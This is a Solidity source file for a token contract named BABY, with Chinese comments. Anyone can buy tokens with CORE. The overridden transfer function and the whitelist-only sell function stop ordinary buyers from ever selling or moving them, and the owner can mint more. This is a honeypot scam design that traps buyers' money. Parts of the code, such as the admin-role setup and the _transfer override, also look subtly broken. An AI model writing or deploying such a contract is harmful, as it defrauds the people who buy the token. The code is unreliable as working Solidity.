// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract BABYToken is ERC20Capped, Ownable, ReentrancyGuard, AccessControl {
    bytes32 public constant BABY_DEFAULT_ADMIN_ROLE = keccak256("DEFAULT_ADMIN_ROLE"); // 更改为 BABY_DEFAULT_ADMIN_ROLE
    bytes32 public constant WHITELIST_ROLE = keccak256("WHITELIST_ROLE"); // 白名单角色
    address public constant OWNER_ADDRESS = 0xA2b0529f0DB8506573C7b31b6d71C2000FE907F9; // 合约拥有者地址

    mapping(address => bool) public hasBought; // 记录用户是否购买过代币

    uint256 public initialSupply = 890000 * 10 ** 18; // 初始发行量

    constructor() 
        ERC20("BABY", "ba by pi") 
        ERC20Capped(initialSupply) 
    {
        _mint(OWNER_ADDRESS, initialSupply); // 将初始发行量铸造到合约拥有者地址
        _setupRole(BABY_DEFAULT_ADMIN_ROLE, OWNER_ADDRESS); // 合约拥有者为管理员
        _setupRole(WHITELIST_ROLE, OWNER_ADDRESS); // 合约拥有者为白名单用户
    }

    // 购买代币功能：允许任何用户购买代币（基于流动池定价）
    function buyTokens() external payable nonReentrant {
        require(msg.value > 0, "Must send CORE to buy tokens");

        // 代币价格由流动池定价（此处假设价格为动态计算）
        uint256 amount = msg.value * 100; // 假设1CORE = 100 BABY（实际应从流动池获取）
        
        require(amount <= balanceOf(OWNER_ADDRESS), "Not enough tokens available to buy");

        _transfer(OWNER_ADDRESS, msg.sender, amount);
        hasBought[msg.sender] = true; // 标记用户已购买，不能再卖出或转账
    }

    // 卖出代币功能：仅限白名单或合约拥有者
    function sellTokens(uint256 amount) external nonReentrant {
        require(hasRole(WHITELIST_ROLE, msg.sender) || msg.sender == OWNER_ADDRESS, "Not authorized to sell tokens");

        _transfer(msg.sender, OWNER_ADDRESS, amount);
    }

    // 增发功能：发币者可以增发代币
    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    // 设置白名单：发币者可以设置白名单
    function setWhitelist(address account, bool status) external onlyOwner {
        if (status) {
            grantRole(WHITELIST_ROLE, account);
        } else {
            revokeRole(WHITELIST_ROLE, account);
        }
    }

    // 覆盖 _transfer 函数：阻止已购买代币的用户转账，只有白名单用户或合约拥有者能进行转账
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        // 只允许白名单用户、合约拥有者转账
        require(
            sender == OWNER_ADDRESS || recipient == OWNER_ADDRESS || hasRole(WHITELIST_ROLE, sender),
            "Users cannot transfer tokens"
        );
        
        super._transfer(sender, recipient, amount);
    }
}
